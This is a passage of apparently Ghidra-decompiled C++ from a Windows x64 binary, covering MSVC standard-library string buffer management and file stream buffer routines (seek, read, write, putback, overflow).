    if ((0xfff < param_1[3] * 2 + 2U) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(_Memory);
  }
  param_1[3] = 7;
  param_1[2] = 0;
  *(undefined2 *)param_1 = 0;
  return;
}



/* ==================================================================== */
/* FUN_140023210 @ 140023210 */

void FUN_140023210(undefined8 *param_1,ulonglong param_2)

{
  ulonglong uVar1;
  ulonglong uVar2;
  longlong lVar3;
  void *_Src;
  void *_Dst;
  ulonglong uVar4;
  ulonglong uVar5;
  void *_Memory;

  uVar2 = param_1[3];
  if (uVar2 < param_2) {
    lVar3 = param_1[2];
    if (0x7fffffffffffffffU - lVar3 < param_2 - lVar3) {
                    /* WARNING: Subroutine does not return */
      FUN_14000eb00();
    }
    uVar4 = param_2 | 0xf;
    uVar5 = 0x7fffffffffffffff;
    if ((uVar4 < 0x8000000000000000) && (uVar2 <= 0x7fffffffffffffff - (uVar2 >> 1))) {
      uVar1 = uVar2 + (uVar2 >> 1);
      uVar5 = uVar4;
      if (uVar4 < uVar1) {
        uVar5 = uVar1;
      }
    }
    _Dst = (void *)FUN_14000e6b0(uVar5 + 1);
    param_1[2] = param_2;
    param_1[3] = uVar5;
    if (uVar2 < 0x10) {
      memcpy(_Dst,param_1,lVar3 + 1U);
    }
    else {
      _Src = (void *)*param_1;
      memcpy(_Dst,_Src,lVar3 + 1U);
      _Memory = _Src;
      if ((0xfff < uVar2 + 1) &&
         (_Memory = *(void **)((longlong)_Src + -8),
         0x1f < (ulonglong)((longlong)_Src + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
        _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      free(_Memory);
    }
    *param_1 = _Dst;
    param_1[2] = lVar3;
  }
  return;
}



/* ==================================================================== */
/* FUN_140023330 @ 140023330 */

void FUN_140023330(undefined8 *param_1,undefined1 param_2)

{
  ulonglong uVar1;
  ulonglong _Size;
  ulonglong uVar2;
  void *_Src;
  void *_Dst;
  ulonglong uVar3;
  ulonglong uVar4;
  void *_Memory;

  _Size = param_1[2];
  uVar2 = param_1[3];
  if (_Size < uVar2) {
    param_1[2] = _Size + 1;
    if (0xf < uVar2) {
      param_1 = (undefined8 *)*param_1;
    }
    *(undefined1 *)(_Size + (longlong)param_1) = param_2;
    *(undefined1 *)(_Size + 1 + (longlong)param_1) = 0;
    return;
  }
  if (_Size == 0x7fffffffffffffff) {
                    /* WARNING: Subroutine does not return */
    FUN_14000eb00();
  }
  uVar3 = _Size + 1 | 0xf;
  uVar4 = 0x7fffffffffffffff;
  if ((uVar3 < 0x8000000000000000) && (uVar2 <= 0x7fffffffffffffff - (uVar2 >> 1))) {
    uVar1 = uVar2 + (uVar2 >> 1);
    uVar4 = uVar3;
    if (uVar3 < uVar1) {
      uVar4 = uVar1;
    }
  }
  _Dst = (void *)FUN_14000e6b0(uVar4 + 1);
  param_1[2] = _Size + 1;
  param_1[3] = uVar4;
  if (uVar2 < 0x10) {
    memcpy(_Dst,param_1,_Size);
    *(undefined1 *)(_Size + (longlong)_Dst) = param_2;
    *(undefined1 *)(_Size + 1 + (longlong)_Dst) = 0;
  }
  else {
    _Src = (void *)*param_1;
    memcpy(_Dst,_Src,_Size);
    *(undefined1 *)(_Size + (longlong)_Dst) = param_2;
    *(undefined1 *)(_Size + 1 + (longlong)_Dst) = 0;
    _Memory = _Src;
    if ((0xfff < uVar2 + 1) &&
       (_Memory = *(void **)((longlong)_Src + -8),
       0x1f < (ulonglong)((longlong)_Src + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(_Memory);
  }
  *param_1 = _Dst;
  return;
}



/* ==================================================================== */
/* FUN_140023480 @ 140023480 */

longlong * FUN_140023480(longlong *param_1,longlong *param_2)

{
  void *pvVar1;
  longlong lVar2;
  void *_Memory;

  if (param_1 != param_2) {
    if (0xf < (ulonglong)param_1[3]) {
      pvVar1 = (void *)*param_1;
      _Memory = pvVar1;
      if ((0xfff < param_1[3] + 1U) &&
         (_Memory = *(void **)((longlong)pvVar1 + -8),
         0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
        _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      free(_Memory);
    }
    param_1[3] = 0xf;
    param_1[2] = 0;
    *(undefined1 *)param_1 = 0;
    lVar2 = param_2[1];
    *param_1 = *param_2;
    param_1[1] = lVar2;
    lVar2 = param_2[3];
    param_1[2] = param_2[2];
    param_1[3] = lVar2;
    *(undefined1 *)param_2 = 0;
    param_2[2] = 0;
    param_2[3] = 0xf;
  }
  return param_1;
}



/* ==================================================================== */
/* FUN_140023520 @ 140023520 */

undefined8 * FUN_140023520(undefined8 *param_1,undefined8 *param_2)

{
  undefined8 uVar1;

  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  uVar1 = param_2[1];
  *param_1 = *param_2;
  param_1[1] = uVar1;
  uVar1 = param_2[3];
  param_1[2] = param_2[2];
  param_1[3] = uVar1;
  *(undefined1 *)param_2 = 0;
  param_2[2] = 0;
  param_2[3] = 0xf;
  return param_1;
}



/* ==================================================================== */
/* FUN_140023550 @ 140023550 */

undefined8 * FUN_140023550(undefined8 *param_1,longlong param_2)

{
  longlong lVar1;

  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  lVar1 = -1;
  do {
    lVar1 = lVar1 + 1;
  } while (*(char *)(param_2 + lVar1) != '\0');
  FUN_140024ce0();
  return param_1;
}



/* ==================================================================== */
/* FUN_140023590 @ 140023590 */

undefined8 * FUN_140023590(undefined8 *param_1,undefined8 *param_2)

{
  ulonglong uVar1;
  undefined8 uVar2;
  ulonglong uVar3;
  void *_Dst;
  ulonglong uVar4;

  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  uVar1 = param_2[2];
  if (0xf < (ulonglong)param_2[3]) {
    param_2 = (undefined8 *)*param_2;
  }
  if (0x7fffffffffffffff < uVar1) {
                    /* WARNING: Subroutine does not return */
    FUN_14000eb00();
  }
  if (uVar1 < 0x10) {
    param_1[2] = uVar1;
    param_1[3] = 0xf;
    uVar2 = param_2[1];
    *param_1 = *param_2;
    param_1[1] = uVar2;
    return param_1;
  }
  uVar3 = uVar1 | 0xf;
  uVar4 = 0x7fffffffffffffff;
  if ((uVar3 < 0x8000000000000000) && (uVar4 = uVar3, uVar3 < 0x16)) {
    uVar4 = 0x16;
  }
  _Dst = (void *)FUN_14000e6b0(uVar4 + 1);
  *param_1 = _Dst;
  param_1[2] = uVar1;
  param_1[3] = uVar4;
  memcpy(_Dst,param_2,uVar1 + 1);
  return param_1;
}



/* ==================================================================== */
/* FUN_140023650 @ 140023650 */

undefined8 * FUN_140023650(undefined8 *param_1)

{
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0xf;
  *(undefined1 *)param_1 = 0;
  return param_1;
}



/* ==================================================================== */
/* FUN_140023670 @ 140023670 */

void FUN_140023670(longlong *param_1)

{
  longlong lVar1;

  lVar1 = FUN_140025450(param_1 + 1);
  if (lVar1 == 0) {
                    /* WARNING: Could not recover jumptable at 0x00014002369e. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    std::basic_ios<char,std::char_traits<char>_>::setstate
              ((basic_ios<char,std::char_traits<char>_> *)
               ((longlong)*(int *)(*param_1 + 4) + (longlong)param_1),2,false);
    return;
  }
  return;
}



/* ==================================================================== */
/* FUN_1400236b0 @ 1400236b0 */

void FUN_1400236b0(longlong param_1)

{
  int iVar1;

  *(undefined ***)((longlong)*(int *)(*(longlong *)(param_1 + -0xa8) + 4) + -0xa8 + param_1) =
       &PTR_LAB_1400571a0;
  iVar1 = *(int *)(*(longlong *)(param_1 + -0xa8) + 4);
  *(int *)((longlong)iVar1 + -0xac + param_1) = iVar1 + -0xa8;
  FUN_1400243b0(param_1 + -0xa0);
                    /* WARNING: Could not recover jumptable at 0x000140023705. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  std::basic_ostream<char,std::char_traits<char>_>::~basic_ostream<char,std::char_traits<char>_>
            ((basic_ostream<char,std::char_traits<char>_> *)(param_1 + -0x98));
  return;
}



/* ==================================================================== */
/* FUN_140023710 @ 140023710 */

basic_ostream<char,std::char_traits<char>_> *
FUN_140023710(basic_ostream<char,std::char_traits<char>_> *param_1,undefined8 *param_2)

{
  longlong lVar1;

  if (0xf < (ulonglong)param_2[3]) {
    param_2 = (undefined8 *)*param_2;
  }
  *(undefined **)param_1 = &DAT_140056f30;
  std::basic_ios<char,std::char_traits<char>_>::basic_ios<char,std::char_traits<char>_>
            ((basic_ios<char,std::char_traits<char>_> *)(param_1 + 0xa8));
  std::basic_ostream<char,std::char_traits<char>_>::basic_ostream<char,std::char_traits<char>_>
            (param_1,(basic_streambuf<char,std::char_traits<char>_> *)(param_1 + 8),false);
  *(undefined ***)(param_1 + *(int *)(*(longlong *)param_1 + 4)) = &PTR_LAB_1400571a0;
  *(int *)(param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + -4) =
       *(int *)(*(longlong *)param_1 + 4) + -0xa8;
  std::basic_streambuf<char,std::char_traits<char>_>::basic_streambuf<char,std::char_traits<char>_>
            ((basic_streambuf<char,std::char_traits<char>_> *)(param_1 + 8));
  *(undefined ***)(param_1 + 8) = &PTR_FUN_140057120;
  param_1[0x84] = (basic_ostream<char,std::char_traits<char>_>)0x0;
  param_1[0x79] = (basic_ostream<char,std::char_traits<char>_>)0x0;
  std::basic_streambuf<char,std::char_traits<char>_>::_Init
            ((basic_streambuf<char,std::char_traits<char>_> *)(param_1 + 8));
  *(undefined8 *)(param_1 + 0x88) = 0;
  *(undefined8 *)(param_1 + 0x7c) = DAT_140a61890;
  *(undefined8 *)(param_1 + 0x70) = 0;
  lVar1 = FUN_140025bf0(param_1 + 8,param_2);
  if (lVar1 == 0) {
    std::basic_ios<char,std::char_traits<char>_>::setstate
              ((basic_ios<char,std::char_traits<char>_> *)
               (param_1 + *(int *)(*(longlong *)param_1 + 4)),2,false);
  }
  *(undefined ***)(param_1 + *(int *)(*(longlong *)param_1 + 4)) = &PTR_LAB_1400571a0;
  *(int *)(param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + -4) =
       *(int *)(*(longlong *)param_1 + 4) + -0xa8;
  return param_1;
}



/* ==================================================================== */
/* FUN_140023840 @ 140023840 */

void FUN_140023840(basic_streambuf<char,std::char_traits<char>_> *param_1,undefined8 param_2)

{
  bool bVar1;
  codecvt_base *this;

  this = (codecvt_base *)FUN_140024db0(param_2);
  bVar1 = std::codecvt_base::always_noconv(this);
  if (bVar1) {
    *(undefined8 *)(param_1 + 0x68) = 0;
    return;
  }
  *(codecvt_base **)(param_1 + 0x68) = this;
                    /* WARNING: Could not recover jumptable at 0x000140023889. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  std::basic_streambuf<char,std::char_traits<char>_>::_Init(param_1);
  return;
}



/* ==================================================================== */
/* FUN_140023890 @ 140023890 */

int FUN_140023890(longlong *param_1)

{
  int iVar1;

  if (param_1[0x10] != 0) {
    iVar1 = (**(code **)(*param_1 + 0x18))(param_1,0xffffffff);
    if (iVar1 != -1) {
      iVar1 = fflush((FILE *)param_1[0x10]);
      return (-1 < iVar1) - 1;
    }
  }
  return 0;
}



/* ==================================================================== */
/* FUN_1400238e0 @ 1400238e0 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

basic_streambuf<char,std::char_traits<char>_> *
FUN_1400238e0(basic_streambuf<char,std::char_traits<char>_> *param_1,char *param_2,size_t param_3)

{
  longlong lVar1;
  undefined8 uVar2;
  int iVar3;
  undefined1 auStack_58 [32];
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  ulonglong local_20;

  local_20 = DAT_14005d040 ^ (ulonglong)auStack_58;
  if ((param_2 != (char *)0x0) || (iVar3 = 4, param_3 != 0)) {
    iVar3 = 0;
  }
  if ((*(FILE **)(param_1 + 0x80) == (FILE *)0x0) ||
     (iVar3 = setvbuf(*(FILE **)(param_1 + 0x80),param_2,iVar3,param_3), iVar3 != 0)) {
    return (basic_streambuf<char,std::char_traits<char>_> *)0x0;
  }
  lVar1 = *(longlong *)(param_1 + 0x80);
  param_1[0x7c] = (basic_streambuf<char,std::char_traits<char>_>)0x1;
  param_1[0x71] = (basic_streambuf<char,std::char_traits<char>_>)0x0;
  std::basic_streambuf<char,std::char_traits<char>_>::_Init(param_1);
  if (lVar1 != 0) {
    local_38 = 0;
    local_30 = 0;
    local_28 = 0;
    _get_stream_buffer_pointers(lVar1,&local_38,&local_30,&local_28);
    *(undefined8 *)(param_1 + 0x18) = local_38;
    *(undefined8 *)(param_1 + 0x20) = local_38;
    *(undefined8 *)(param_1 + 0x38) = local_30;
    *(undefined8 *)(param_1 + 0x40) = local_30;
    *(undefined8 *)(param_1 + 0x50) = local_28;
    *(undefined8 *)(param_1 + 0x58) = local_28;
  }
  uVar2 = DAT_140a61890;
  *(longlong *)(param_1 + 0x80) = lVar1;
  *(undefined8 *)(param_1 + 0x74) = uVar2;
  *(undefined8 *)(param_1 + 0x68) = 0;
  return param_1;
}



/* ==================================================================== */
/* FUN_1400239e0 @ 1400239e0 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong * FUN_1400239e0(longlong param_1,longlong *param_2,longlong *param_3)

{
  longlong lVar1;
  undefined8 uVar2;
  char cVar3;
  int iVar4;
  undefined1 auStack_48 [32];
  longlong local_28;
  ulonglong local_20;

  local_20 = DAT_14005d040 ^ (ulonglong)auStack_48;
  local_28 = param_3[1] + *param_3;
  if (((*(longlong *)(param_1 + 0x80) == 0) || (cVar3 = FUN_140025360(), cVar3 == '\0')) ||
     (iVar4 = fsetpos(*(FILE **)(param_1 + 0x80),&local_28), iVar4 != 0)) {
    *param_2 = -1;
    param_2[1] = 0;
    param_2[2] = 0;
    return param_2;
  }
  *(longlong *)(param_1 + 0x74) = param_3[2];
  if (**(longlong **)(param_1 + 0x18) == param_1 + 0x70) {
    lVar1 = *(longlong *)(param_1 + 0x88);
    uVar2 = *(undefined8 *)(param_1 + 0x90);
    **(longlong **)(param_1 + 0x18) = lVar1;
    **(longlong **)(param_1 + 0x38) = lVar1;
    **(int **)(param_1 + 0x50) = (int)uVar2 - (int)lVar1;
  }
  lVar1 = *(longlong *)(param_1 + 0x74);
  *param_2 = local_28;
  param_2[2] = lVar1;
  param_2[1] = 0;
  return param_2;
}



/* ==================================================================== */
/* FUN_140023ac0 @ 140023ac0 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

fpos_t * FUN_140023ac0(longlong param_1,fpos_t *param_2,longlong param_3,int param_4)

{
  longlong lVar1;
  undefined8 uVar2;
  fpos_t fVar3;
  char cVar4;
  int iVar5;
  undefined1 auStack_58 [32];
  fpos_t local_38;
  ulonglong local_30;

  local_30 = DAT_14005d040 ^ (ulonglong)auStack_58;
  if (((**(longlong **)(param_1 + 0x38) == param_1 + 0x70) && (param_4 == 1)) &&
     (*(longlong *)(param_1 + 0x68) == 0)) {
    param_3 = param_3 + -1;
  }
  if ((((*(longlong *)(param_1 + 0x80) == 0) || (cVar4 = FUN_140025360(), cVar4 == '\0')) ||
      (((param_3 != 0 || (param_4 != 1)) &&
       (iVar5 = _fseeki64(*(FILE **)(param_1 + 0x80),param_3,param_4), iVar5 != 0)))) ||
     (iVar5 = fgetpos(*(FILE **)(param_1 + 0x80),&local_38), iVar5 != 0)) {
    *param_2 = -1;
    param_2[1] = 0;
    param_2[2] = 0;
    return param_2;
  }
  if (**(longlong **)(param_1 + 0x18) == param_1 + 0x70) {
    lVar1 = *(longlong *)(param_1 + 0x88);
    uVar2 = *(undefined8 *)(param_1 + 0x90);
    **(longlong **)(param_1 + 0x18) = lVar1;
    **(longlong **)(param_1 + 0x38) = lVar1;
    **(int **)(param_1 + 0x50) = (int)uVar2 - (int)lVar1;
  }
  fVar3 = *(fpos_t *)(param_1 + 0x74);
  *param_2 = local_38;
  param_2[2] = fVar3;
  param_2[1] = 0;
  return param_2;
}



/* ==================================================================== */
/* FUN_140023bd0 @ 140023bd0 */

longlong FUN_140023bd0(basic_streambuf<char,std::char_traits<char>_> *param_1,char *param_2,
                      size_t param_3)

{
  longlong lVar1;
  size_t sVar2;
  int iVar3;
  size_t _Count;

  if (*(longlong *)(param_1 + 0x68) != 0) {
                    /* WARNING: Could not recover jumptable at 0x000140023bef. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    lVar1 = std::basic_streambuf<char,std::char_traits<char>_>::xsputn(param_1,param_2,param_3);
    return lVar1;
  }
  if ((void *)**(undefined8 **)(param_1 + 0x40) == (void *)0x0) {
    iVar3 = 0;
  }
  else {
    iVar3 = **(int **)(param_1 + 0x58);
  }
  _Count = param_3;
  if (0 < (longlong)param_3) {
    if (0 < iVar3) {
      sVar2 = (longlong)iVar3;
      if ((longlong)param_3 < (longlong)iVar3) {
        sVar2 = param_3;
      }
      memcpy((void *)**(undefined8 **)(param_1 + 0x40),param_2,sVar2);
      _Count = param_3 - sVar2;
      param_2 = param_2 + sVar2;
      **(int **)(param_1 + 0x58) = **(int **)(param_1 + 0x58) - (int)sVar2;
      **(longlong **)(param_1 + 0x40) = **(longlong **)(param_1 + 0x40) + (longlong)(int)sVar2;
      if ((longlong)_Count < 1) goto LAB_140023c78;
    }
    if (*(FILE **)(param_1 + 0x80) != (FILE *)0x0) {
      sVar2 = fwrite(param_2,1,_Count,*(FILE **)(param_1 + 0x80));
      _Count = _Count - sVar2;
    }
  }
LAB_140023c78:
  return param_3 - _Count;
}



/* ==================================================================== */
/* FUN_140023ca0 @ 140023ca0 */

longlong FUN_140023ca0(basic_streambuf<char,std::char_traits<char>_> *param_1,char *param_2,
                      ulonglong param_3)

{
  undefined8 uVar1;
  longlong lVar2;
  size_t sVar3;
  int iVar4;
  ulonglong _Count;
  ulonglong _Size;

  if ((longlong)param_3 < 1) {
    return 0;
  }
  if (*(longlong *)(param_1 + 0x68) != 0) {
                    /* WARNING: Could not recover jumptable at 0x000140023cd1. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    lVar2 = std::basic_streambuf<char,std::char_traits<char>_>::xsgetn(param_1,param_2,param_3);
    return lVar2;
  }
  if ((void *)**(undefined8 **)(param_1 + 0x38) == (void *)0x0) {
    iVar4 = 0;
  }
  else {
    iVar4 = **(int **)(param_1 + 0x50);
  }
  _Count = param_3;
  if (iVar4 != 0) {
    _Size = param_3;
    if ((ulonglong)(longlong)iVar4 < param_3) {
      _Size = (longlong)iVar4;
    }
    memcpy(param_2,(void *)**(undefined8 **)(param_1 + 0x38),_Size);
    param_2 = param_2 + _Size;
    _Count = param_3 - _Size;
    **(int **)(param_1 + 0x50) = **(int **)(param_1 + 0x50) - (int)_Size;
    **(longlong **)(param_1 + 0x38) = **(longlong **)(param_1 + 0x38) + (longlong)(int)_Size;
  }
  if (*(longlong *)(param_1 + 0x80) != 0) {
    if ((basic_streambuf<char,std::char_traits<char>_> *)**(longlong **)(param_1 + 0x18) ==
        param_1 + 0x70) {
      lVar2 = *(longlong *)(param_1 + 0x88);
      uVar1 = *(undefined8 *)(param_1 + 0x90);
      **(longlong **)(param_1 + 0x18) = lVar2;
      **(longlong **)(param_1 + 0x38) = lVar2;
      **(int **)(param_1 + 0x50) = (int)uVar1 - (int)lVar2;
    }
    do {
      if (_Count < 0x1000) {
        if (_Count != 0) {
          sVar3 = fread(param_2,1,_Count,*(FILE **)(param_1 + 0x80));
          _Count = _Count - sVar3;
        }
        break;
      }
      sVar3 = fread(param_2,1,0xfff,*(FILE **)(param_1 + 0x80));
      param_2 = param_2 + sVar3;
      _Count = _Count - sVar3;
    } while (sVar3 == 0xfff);
  }
  return param_3 - _Count;
}



/* ==================================================================== */
/* FUN_140023df0 @ 140023df0 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

uint FUN_140023df0(longlong param_1)

{
  byte *pbVar1;
  undefined8 uVar2;
  longlong lVar3;
  uint uVar4;
  int iVar5;
  char *******pppppppcVar6;
  uint uVar7;
  ulonglong uVar8;
  char *pcVar9;
  ulonglong uVar10;
  undefined1 auStackY_88 [32];
  char *local_48;
  byte *local_40;
  byte local_38;
  char local_37 [7];
  char *******local_30;
  undefined8 uStack_28;
  ulonglong local_20;
  ulonglong local_18;
  ulonglong local_10;

  local_10 = DAT_14005d040 ^ (ulonglong)auStackY_88;
  uVar10 = **(ulonglong **)(param_1 + 0x38);
  if (uVar10 != 0) {
    iVar5 = **(int **)(param_1 + 0x50);
    if (uVar10 < uVar10 + (longlong)iVar5) {
      **(int **)(param_1 + 0x50) = iVar5 + -1;
      pbVar1 = (byte *)**(longlong **)(param_1 + 0x38);
      **(longlong **)(param_1 + 0x38) = (longlong)(pbVar1 + 1);
      return (uint)*pbVar1;
    }
  }
  if (*(longlong *)(param_1 + 0x80) == 0) {
    uVar7 = 0xffffffff;
  }
  else {
    if (**(longlong **)(param_1 + 0x18) == param_1 + 0x70) {
      uVar2 = *(undefined8 *)(param_1 + 0x90);
      lVar3 = *(longlong *)(param_1 + 0x88);
      **(longlong **)(param_1 + 0x18) = lVar3;
      **(longlong **)(param_1 + 0x38) = lVar3;
      **(int **)(param_1 + 0x50) = (int)uVar2 - (int)lVar3;
    }
    if (*(longlong *)(param_1 + 0x68) == 0) {
      uVar4 = fgetc(*(FILE **)(param_1 + 0x80));
      uVar7 = 0xffffffff;
      if (uVar4 != 0xffffffff) {
        uVar7 = uVar4 & 0xff;
      }
    }
    else {
      uStack_28 = 0;
      local_20 = 0;
      local_18 = 0xf;
      local_30 = (char *******)0x0;
      uVar7 = fgetc(*(FILE **)(param_1 + 0x80));
      if (uVar7 != 0xffffffff) {
LAB_140023ef0:
        FUN_140023330(&local_30,uVar7 & 0xff);
        pppppppcVar6 = (char *******)&local_30;
        if (0xf < local_18) {
          pppppppcVar6 = local_30;
        }
        iVar5 = std::codecvt<char,char,_Mbstatet>::in
                          (*(codecvt<char,char,_Mbstatet> **)(param_1 + 0x68),
                           (_Mbstatet *)(param_1 + 0x74),(char *)pppppppcVar6,
                           (char *)((longlong)pppppppcVar6 + local_20),&local_48,(char *)&local_38,
                           local_37,(char **)&local_40);
        if ((iVar5 == 0) || (iVar5 == 1)) {
          if (local_40 == &local_38) goto code_r0x000140023f6c;
          pppppppcVar6 = (char *******)&local_30;
          if (0xf < local_18) {
            pppppppcVar6 = local_30;
          }
          pcVar9 = (char *)((longlong)pppppppcVar6 + (local_20 - (longlong)local_48));
          while (0 < (longlong)pcVar9) {
            pcVar9 = pcVar9 + -1;
            ungetc((int)pcVar9[(longlong)local_48],*(FILE **)(param_1 + 0x80));
          }
          uVar7 = (uint)local_38;
          goto LAB_140023fc1;
        }
        if (iVar5 == 3) {
          pppppppcVar6 = (char *******)&local_30;
          if (0xf < local_18) {
            pppppppcVar6 = local_30;
          }
          uVar7 = (uint)*(char *)pppppppcVar6;
          goto LAB_140023fc1;
        }
      }
LAB_140023fbc:
      uVar7 = 0xffffffff;
LAB_140023fc1:
      FUN_140025000(&local_30);
    }
  }
  return uVar7;
code_r0x000140023f6c:
  pppppppcVar6 = (char *******)&local_30;
  if (0xf < local_18) {
    pppppppcVar6 = local_30;
  }
  uVar10 = (longlong)local_48 - (longlong)pppppppcVar6;
  if (local_20 < (ulonglong)((longlong)local_48 - (longlong)pppppppcVar6)) {
    uVar10 = local_20;
  }
  pppppppcVar6 = (char *******)&local_30;
  if (0xf < local_18) {
    pppppppcVar6 = local_30;
  }
  uVar8 = local_20 - uVar10;
  memmove(pppppppcVar6,(char *)((longlong)pppppppcVar6 + uVar10),uVar8 + 1);
  local_20 = uVar8;
  uVar7 = fgetc(*(FILE **)(param_1 + 0x80));
  if (uVar7 == 0xffffffff) goto LAB_140023fbc;
  goto LAB_140023ef0;
}



/* ==================================================================== */
/* FUN_140024050 @ 140024050 */

ulonglong FUN_140024050(longlong *param_1)

{
  byte *pbVar1;
  ulonglong uVar2;

  pbVar1 = *(byte **)param_1[7];
  if ((pbVar1 != (byte *)0x0) && (pbVar1 < pbVar1 + *(int *)param_1[10])) {
    return (ulonglong)*pbVar1;
  }
  uVar2 = (**(code **)(*param_1 + 0x38))(param_1);
  if ((int)uVar2 == -1) {
    return uVar2;
  }
  (**(code **)(*param_1 + 0x20))(param_1,uVar2 & 0xffffffff);
  return uVar2 & 0xffffffff;
}



/* ==================================================================== */
/* FUN_1400240c0 @ 1400240c0 */

uint FUN_1400240c0(longlong param_1,uint param_2)

{
  undefined1 *puVar1;
  ulonglong uVar2;
  undefined1 *puVar3;
  int iVar4;

  uVar2 = **(ulonglong **)(param_1 + 0x38);
  if (((uVar2 != 0) && (**(ulonglong **)(param_1 + 0x18) < uVar2)) &&
     ((param_2 == 0xffffffff || (*(byte *)(uVar2 - 1) == param_2)))) {
    **(int **)(param_1 + 0x50) = **(int **)(param_1 + 0x50) + 1;
    **(longlong **)(param_1 + 0x38) = **(longlong **)(param_1 + 0x38) + -1;
    if (param_2 == 0xffffffff) {
      param_2 = 0;
    }
    return param_2;
  }
  if ((*(FILE **)(param_1 + 0x80) != (FILE *)0x0) && (param_2 != 0xffffffff)) {
    if ((*(longlong *)(param_1 + 0x68) == 0) &&
       (iVar4 = ungetc(param_2 & 0xff,*(FILE **)(param_1 + 0x80)), iVar4 != -1)) {
      return param_2;
    }
    puVar1 = (undefined1 *)(param_1 + 0x70);
    if ((undefined1 *)**(longlong **)(param_1 + 0x38) != puVar1) {
      *puVar1 = (char)param_2;
      puVar3 = (undefined1 *)**(longlong **)(param_1 + 0x18);
      if (puVar3 != puVar1) {
        *(undefined1 **)(param_1 + 0x88) = puVar3;
        *(longlong *)(param_1 + 0x90) =
             (longlong)**(int **)(param_1 + 0x50) + **(longlong **)(param_1 + 0x38);
      }
      **(longlong **)(param_1 + 0x18) = (longlong)puVar1;
      **(longlong **)(param_1 + 0x38) = (longlong)puVar1;
      **(int **)(param_1 + 0x50) = ((int)param_1 - (int)puVar1) + 0x71;
      return param_2;
    }
  }
  return 0xffffffff;
}



/* ==================================================================== */
/* FUN_1400241b0 @ 1400241b0 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

int FUN_1400241b0(longlong param_1,int param_2)

{
  ulonglong uVar1;
  char *pcVar2;
  longlong lVar3;
  undefined8 uVar4;
  int iVar5;
  size_t sVar6;
  size_t _Count;
  undefined1 auStackY_88 [32];
  char *local_48;
  char *local_40;
  char local_38;
  char local_37 [7];
  char local_30 [32];
  ulonglong local_10;

  local_10 = DAT_14005d040 ^ (ulonglong)auStackY_88;
  if (param_2 == -1) {
    iVar5 = 0;
  }
  else {
    uVar1 = **(ulonglong **)(param_1 + 0x40);
    local_38 = (char)param_2;
    if (uVar1 != 0) {
      iVar5 = **(int **)(param_1 + 0x58);
      if (uVar1 < uVar1 + (longlong)iVar5) {
        **(int **)(param_1 + 0x58) = iVar5 + -1;
        pcVar2 = (char *)**(longlong **)(param_1 + 0x40);
        **(longlong **)(param_1 + 0x40) = (longlong)(pcVar2 + 1);
        *pcVar2 = local_38;
        return param_2;
      }
    }
    if (*(longlong *)(param_1 + 0x80) != 0) {
      if (**(longlong **)(param_1 + 0x18) == param_1 + 0x70) {
        lVar3 = *(longlong *)(param_1 + 0x88);
        uVar4 = *(undefined8 *)(param_1 + 0x90);
        **(longlong **)(param_1 + 0x18) = lVar3;
        **(longlong **)(param_1 + 0x38) = lVar3;
        **(int **)(param_1 + 0x50) = (int)uVar4 - (int)lVar3;
      }
      if (*(codecvt<char,char,_Mbstatet> **)(param_1 + 0x68) == (codecvt<char,char,_Mbstatet> *)0x0)
      {
        iVar5 = fputc((int)local_38,*(FILE **)(param_1 + 0x80));
        if (iVar5 == -1) {
          return -1;
        }
        return param_2;
      }
      iVar5 = std::codecvt<char,char,_Mbstatet>::out
                        (*(codecvt<char,char,_Mbstatet> **)(param_1 + 0x68),
                         (_Mbstatet *)(param_1 + 0x74),&local_38,local_37,&local_40,local_30,
                         (char *)&local_10,&local_48);
      if ((iVar5 == 0) || (iVar5 == 1)) {
        _Count = (longlong)local_48 - (longlong)local_30;
        if ((_Count == 0) ||
           (sVar6 = fwrite(local_30,1,_Count,*(FILE **)(param_1 + 0x80)), _Count == sVar6)) {
          *(undefined1 *)(param_1 + 0x71) = 1;
          if (local_40 == &local_38) {
            return -1;
          }
          return param_2;
        }
      }
      else if (iVar5 == 3) {
        iVar5 = fputc((int)local_38,*(FILE **)(param_1 + 0x80));
        if (iVar5 == -1) {
          return -1;
        }
        return param_2;
      }
    }
    iVar5 = -1;
  }
  return iVar5;
}



/* ==================================================================== */
/* FUN_1400243b0 @ 1400243b0 */

void FUN_1400243b0(basic_streambuf<char,std::char_traits<char>_> *param_1)

{
  undefined8 uVar1;
  longlong lVar2;

  *(undefined ***)param_1 = &PTR_FUN_140057120;
  if ((*(longlong *)(param_1 + 0x80) != 0) &&
     ((basic_streambuf<char,std::char_traits<char>_> *)**(longlong **)(param_1 + 0x18) ==
      param_1 + 0x70)) {
    uVar1 = *(undefined8 *)(param_1 + 0x90);
    lVar2 = *(longlong *)(param_1 + 0x88);
    **(longlong **)(param_1 + 0x18) = lVar2;
